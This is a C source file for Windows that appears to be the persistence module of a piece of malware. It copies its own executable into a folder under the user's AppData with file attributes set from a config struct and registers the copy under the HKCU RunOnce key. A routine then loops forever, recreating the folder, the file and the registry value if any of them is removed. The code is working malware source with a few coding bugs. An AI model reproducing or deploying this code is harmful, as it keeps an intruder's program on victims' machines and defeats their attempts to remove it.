#include "Startup.h"
// Forward declarations not present in header
BOOL WriteBufferToDisk(LPWSTR wStrFilePath, LPBYTE ptrBuffer, DWORD dwSizeofBuffer, DWORD dwFileAttributes);
BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes);
BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue);
LPWSTR GetAppDataLocation();
LPWSTR ConcatenateInstallFolder(LPWSTR wStrInstallFolder);
LPWSTR ConcatenateInstallFile(LPWSTR wStrConcatenatedFolder, LPWSTR wStrFileName);

BOOL WriteBufferToDisk(LPWSTR wStrFilePath, LPBYTE ptrBuffer, DWORD dwSizeofBuffer, DWORD dwFileAttributes) {

	BOOL bSuccess = FALSE;

	// Create new file, even if already exists
	HANDLE hFile = CreateFileW(wStrFilePath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (!hFile) {
		return bSuccess;
	}

	// Write buffer to new file
	DWORD dwWritten = 0;
	if (WriteFile(hFile, ptrBuffer, dwSizeofBuffer, &dwWritten, NULL)) {
		if (dwWritten != dwSizeofBuffer) {
			CloseHandle(hFile);
			return bSuccess;
		}
	}

	// Close handle
	CloseHandle(hFile);

	// Set Attributes
	if (dwFileAttributes) {
		if (!SetFileAttributesW(wStrFilePath, dwFileAttributes)) {
			return bSuccess;
		}
	}

	return (bSuccess = TRUE);
}

LPWSTR GetAppDataLocation() {

	LPWSTR wStrPath = (LPWSTR)malloc(MAX_PATH);

	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, NULL, wStrPath))) {
		return wStrPath;
	}

	return NULL;
}

LPWSTR ConcatenateInstallFolder(LPWSTR wStrInstallFolder) {

	LPWSTR wStrAppData = GetAppDataLocation();
	if (!wStrAppData) {
		return NULL;
	}

	LPWSTR wStrReturnValue = NULL;
	wStrReturnValue = lstrcatW(wStrAppData, L"\\");
	wStrReturnValue = lstrcatW(wStrReturnValue, wStrInstallFolder);

	if (wStrReturnValue) {
		return wStrReturnValue;
	}

	return NULL;
}

LPWSTR ConcatenateInstallFile(LPWSTR wStrConcatenatedFolder, LPWSTR wStrFileName) {

	LPWSTR wStrAppData = GetAppDataLocation();
	if (!wStrAppData) {
		return NULL;
	}

	LPWSTR wStrReturnValue = NULL;
	wStrReturnValue = lstrcatW(wStrConcatenatedFolder, L"\\");
	wStrReturnValue = lstrcatW(wStrReturnValue, wStrFileName);

	if (wStrReturnValue) {
		return wStrReturnValue;
	}

	return NULL;
}

BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes) {

	BOOL bSuccess = FALSE;

	if (PathFileExistsW(wStrDirectoryPath)) {
		return (bSuccess = TRUE);
	}

	if (CreateDirectoryW(wStrDirectoryPath, NULL)) {
		if (dwFolderAttributes) {
			SetFileAttributesW(wStrDirectoryPath, dwFolderAttributes);
			return (bSuccess = TRUE);
		}
	}

	return bSuccess;
}

BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue) { 

	BOOL bSuccess = FALSE;
	HKEY hKey = NULL;

	// Open RunOnce registry hive
	LSTATUS lRegStatus = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", NULL, KEY_ALL_ACCESS, &hKey);
	if (lRegStatus != ERROR_SUCCESS) {
		return bSuccess;
	}

	// Check if our value is already present
	LPBYTE ptrRegBuffer = NULL;
	DWORD dwSizeofRegBuffer = NULL;
	lRegStatus = RegQueryValueExW(hKey, wStrRegKeyName, NULL, NULL, ptrRegBuffer, &dwSizeofRegBuffer);

	if (!ptrRegBuffer) {
		// If not, we must set the value
		lRegStatus = RegSetValueExW(hKey, wStrRegKeyName, NULL, REG_SZ, (LPBYTE)wStrRegKeyValue, lstrlenW(wStrRegKeyValue) * sizeof(WCHAR));
		if (lRegStatus == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return (bSuccess = TRUE);
		}
	}
	else {
		// If our key is already present close key and return true
		if (lstrcmpW((LPWSTR)ptrRegBuffer, wStrRegKeyValue) == 0) {
			RegCloseKey(hKey);
			return (bSuccess = TRUE);
		}
	}
}

BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
	OUT LPBYTE* ptrExecutableBuffer,
	OUT LPWSTR* wPtrStrFolder,
	OUT LPWSTR* wPtrStrFile,
	OUT PDWORD	dwPtrBufferSize) {

	BOOL bSuccess = FALSE;

	// FIXTHIS : Correctly map PE into buffer totally in-memory 
	
	/*
	// Get current imagebase
	HMODULE hCurrentModule = GetModuleHandleW(NULL);
	if (!hCurrentModule) {
		return bSuccess;
	}
	
	// Read PE from imagebase
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hCurrentModule;
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) {
		return bSuccess;
	}

	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)hCurrentModule + pIDH->e_lfanew);
	if (pINH->Signature != IMAGE_NT_SIGNATURE) {
		return bSuccess;
	}
	
	// Read current PE size
	DWORD dwExeSize = pINH->OptionalHeader.SizeOfImage;

	// Allocate a buffer to copy the current PE into
	LPBYTE ptrExeBuffer = (LPBYTE)malloc(dwExeSize + 1);
	if (!ptrExeBuffer) {
		return bSuccess;
	}

	*/ 

	// Temporary
	// get a physical handle to self instead of in-memory one
	WCHAR lpszSfxPath[MAX_PATH];
	GetModuleFileNameW(NULL, lpszSfxPath, MAX_PATH);
	HANDLE hFile = CreateFileW(lpszSfxPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	
	DWORD dwExeSize = GetFileSize(hFile, NULL);
	LPVOID fileData = HeapAlloc(GetProcessHeap(), 0, dwExeSize); 
	if (!ReadFile(hFile, fileData, dwExeSize, NULL, NULL)) // fill buffer
	{
		return bSuccess;
	}

	// initiate vacant buffer
	LPBYTE ptrExeBuffer = (LPBYTE)malloc(dwExeSize + 1);
	if (!ptrExeBuffer) {
		return bSuccess;
	}

	// Copy current PE into buffer
	memcpy_s(ptrExeBuffer, dwExeSize, fileData, dwExeSize);
	

	// Concatenate folder name
	LPWSTR wStrConcatenatedFolder = ConcatenateInstallFolder(ptrInfo->wStrFolderName);
	if (!wStrConcatenatedFolder) {
		free(ptrExeBuffer);
		return bSuccess;
	}

	// Create intallation folder
	if (!MakeDirectory(wStrConcatenatedFolder, ptrInfo->dwInstallationAttributes)) {
		free(ptrExeBuffer);
		return bSuccess;
	}

	// Concatenate file name
	LPWSTR wStrInstallationPath = ConcatenateInstallFile(wStrConcatenatedFolder, ptrInfo->wStrFileName);
	if (!wStrInstallationPath) {
		free(ptrExeBuffer);
		return bSuccess;
	}

	// Write file to disk
	if (!WriteBufferToDisk(wStrInstallationPath, ptrExeBuffer, dwExeSize, ptrInfo->dwInstallationAttributes)) {
		free(ptrExeBuffer);
		return bSuccess;
	}

	// Create registry key
	if (!CreateRegKey(ptrInfo->wStrRegKeyName, wStrInstallationPath)) {
		free(ptrExeBuffer);
		return bSuccess;
	}

	// Assign OUT params
	*ptrExecutableBuffer = ptrExeBuffer;

	*wPtrStrFolder = (LPWSTR)malloc(MAX_PATH);
	RtlSecureZeroMemory(*wPtrStrFolder, MAX_PATH);

	*wPtrStrFile = (LPWSTR)malloc(MAX_PATH);
	RtlSecureZeroMemory(*wPtrStrFile, MAX_PATH);

	memcpy(*wPtrStrFile, wStrInstallationPath, lstrlenW(wStrInstallationPath) * sizeof(WCHAR));
	PathRemoveFileSpecW(wStrInstallationPath);
	memcpy(*wPtrStrFolder, wStrInstallationPath, lstrlen(wStrInstallationPath)* sizeof(WCHAR));

	*dwPtrBufferSize = dwExeSize;

	return (bSuccess = TRUE);
}

VOID RunStartupRoutine(LPVOID lpParam) {

	if (!lpParam) {
		return;
	}

	PINSTALLATION_INFO ptrInstallInfo = (PINSTALLATION_INFO)lpParam;

	LPBYTE ptrExeBuffer = NULL;
	LPWSTR ptrStrFolder = NULL;
	LPWSTR ptrStrFile = NULL;
	DWORD dwSizeofBuffer = NULL;

	DoInitialInstallation(ptrInstallInfo, &ptrExeBuffer, &ptrStrFolder, &ptrStrFile, &dwSizeofBuffer);

	while (TRUE) {

		if (!PathFileExistsW(ptrStrFolder)) {
			MakeDirectory(ptrStrFolder, ptrInstallInfo->dwInstallationAttributes);
			WriteBufferToDisk(ptrStrFile, ptrExeBuffer, dwSizeofBuffer, ptrInstallInfo->dwInstallationAttributes);
		}

		if (PathFileExistsW(ptrStrFolder) && !PathFileExistsW(ptrStrFile)) {
			WriteBufferToDisk(ptrStrFile, ptrExeBuffer, dwSizeofBuffer, ptrInstallInfo->dwInstallationAttributes);
		}

		CreateRegKey(ptrInstallInfo->wStrRegKeyName, ptrStrFile);
	}
}
